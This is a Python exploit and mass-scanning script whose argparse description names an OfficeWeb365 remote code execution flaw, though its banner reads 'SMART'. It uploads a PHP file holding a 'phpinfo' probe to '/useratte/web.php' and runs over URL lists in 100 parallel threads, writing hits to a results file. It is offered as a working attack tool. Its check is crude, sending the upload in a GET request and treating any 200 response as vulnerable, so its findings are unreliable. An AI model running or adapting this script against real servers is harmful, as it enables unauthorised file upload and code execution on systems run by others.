import requests,argparse,sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    test = """
                    
                ███████╗███╗   ███╗ █████╗ ██████╗ ████████╗
                ██╔════╝████╗ ████║██╔══██╗██╔══██╗╚══██╔══╝
                ███████╗██╔████╔██║███████║██████╔╝   ██║   
                ╚════██║██║╚██╔╝██║██╔══██║██╔══██╗   ██║   
                ███████║██║ ╚═╝ ██║██║  ██║██║  ██║   ██║   
                ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                                            author:秋妤
                                                            date:2024.09.16
                                                            version:1.0
    
  """
    print(test)


def poc(target):
    payload = "/useratte/web.php?"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'multipart/form-data; boundary=---------------------------42328904123665875270630079328',
        'Content-Length': '598',
        'Upgrade-Insecure-Requests': '1',
        'Connection': 'close'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    data = """-----------------------------42328904123665875270630079328
            Content-Disposition: form-data; name="file_upload"; filename="2.php"
            Content-Type: application/octet-stream
            
            <?=phpinfo();
            -----------------------------42328904123665875270630079328
            Content-Disposition: form-data; name="id_type"
            
            1
            -----------------------------42328904123665875270630079328
            Content-Disposition: form-data; name="1_ck"
            
            1_radhttp
            -----------------------------42328904123665875270630079328
            Content-Disposition: form-data; name="mode"
            
            import
            -----------------------------42328904123665875270630079328—"""
    try:
        res1 = requests.get(url=target+payload,headers=headers,data=data,timeout=10,verify=False,proxies=proxies)
        if res1.status_code == 200:
            print(f"[+]{target}存在漏洞")
            with open('smart_result.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
            print(f'[-]{target}不存在漏洞')
    except Exception as e:
        print(e)


def main():
    banner()
    parser = argparse.ArgumentParser(description='OfficeWeb365 远程代码执行漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

if __name__ == '__main__':
    main()